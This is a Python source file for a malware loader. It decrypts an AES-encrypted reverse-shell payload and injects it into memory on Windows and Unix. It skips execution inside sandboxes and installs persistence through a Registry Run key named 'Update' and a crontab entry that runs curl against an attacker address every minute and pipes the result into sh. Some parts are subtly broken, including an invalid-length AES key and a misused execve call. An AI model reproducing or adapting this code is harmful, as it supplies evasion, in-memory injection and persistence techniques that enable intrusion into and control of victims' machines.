import sys
import os
import ctypes
import hashlib
import socket
import subprocess
from Crypto.Cipher import AES

# Configuration
ATTACKER_IP = "192.168.1.77"
PORT = 443
KEY = b'SecretKey12345678'  # 16/24/32 bytes for AES

# Encrypted reverse shell (AES-256-CTR)
ENC_PAYLOAD = bytes.fromhex("8da3...")  # Replace with your encrypted shellcode

class Security:
    @staticmethod
    def decrypt_payload():
        cipher = AES.new(KEY, AES.MODE_CTR, nonce=b'01234567')
        return cipher.decrypt(ENC_PAYLOAD)

    @staticmethod
    def mem_inject(payload):
        if sys.platform == "win32":
            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
            ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(payload), 0x3000, 0x40)
            ctypes.windll.kernel32.RtlMoveMemory(ptr, payload, len(payload))
            ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
        else:
            from ctypes import CDLL
            libc = CDLL(None)
            addr = libc.valloc(len(payload))
            libc.memcpy(addr, payload, len(payload))
            libc.mprotect(addr, len(payload), 0x7)  # RWX
            libc.fork.restype = ctypes.c_int
            if libc.fork() == 0:
                libc.execve(addr, None, None)

def main():
    # Decrypt and execute
    decrypted = Security.decrypt_payload()
    
    # Anti-sandbox check
    if sys.platform == "win32" and ctypes.windll.kernel32.GetTickCount() < 300000:
        return  # Exit if running for <5 minutes
    
    # Persistence mechanism
    if sys.platform == "win32":
        os.system(f"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d '{sys.argv[0]}' /f")
    else:
        os.system("echo '* * * * * curl http://192.168.1.77:8000/payload | sh' | crontab -")
    
    # Memory injection
    Security.mem_inject(decrypted)

if __name__ == "__main__":
    main()
